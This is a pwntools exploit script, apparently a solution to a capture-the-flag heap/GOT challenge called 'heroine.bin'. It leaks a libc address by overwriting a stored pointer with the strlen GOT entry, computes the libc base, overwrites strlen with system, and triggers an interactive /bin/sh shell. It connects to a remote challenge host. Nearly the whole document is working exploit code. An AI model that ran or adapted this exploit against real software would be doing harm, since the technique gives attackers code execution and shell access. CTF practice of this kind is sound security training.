from pwn import *

binary = './heroine.bin'

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary,checksec=False)

if args.REMOTE:
    libc = ELF('./libc.so.6',checksec=False)
else:
    libc = e.libc

gs = '''
break *exit
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('139.144.30.173',31337)
        #return remote("cyberheroines-kateryna-yushchenko.chals.io", 443, ssl=True, sni="cyberheroines-kateryna-yushchenko.chals.io")
    else:
        return process(e.path)

def add(heroine):
    log.info('Adding Heroine: %s' %heroine)
    p.recvuntil(b'>>>')
    p.sendline(b'2')
    p.sendline(heroine)

def edit(old,new):
    log.info('Editing %s<-%s' %(old,new))
    p.recvuntil(b'>>>')
    p.sendline(b'4')
    p.sendline(old)
    p.sendline(new)

def delete(heroine):
    log.info('Deleting heroine %s' %heroine)
    p.recvuntil(b'>>>')
    p.sendline(b'3')
    p.sendline(heroine)

def show():
    log.info('Showing heroines')
    p.recvuntil(b'>>>')
    p.sendline(b'1')

p = start()

def init_db():
   add(b'/bin/sh')
   for i in range(0,5):
      add(chr(0x41+i).encode()*4)

def leak_strlen():
   edit(b'B'*4,b'B'*56+p64(e.got['strlen']))
   show()
   for _ in range(0,4):
      p.recvuntil(b'<<< Cyber Heroine: ')
   leak = u64(p.recvline().strip(b'\n').ljust(8,b'\x00'))
   log.info('Strlen Leak : 0x%x' %leak)
   libc.address=leak-1462336
   log.info('Libc Leak   : 0x%x' %libc.address)

def overwrite_strlen():
   add(p64(libc.sym['system']+5))

def trigger_bin_sh():
   edit(b'/bin/sh',b'/bin/sh')

init_db()
leak_strlen()
overwrite_strlen()
trigger_bin_sh()
p.interactive()
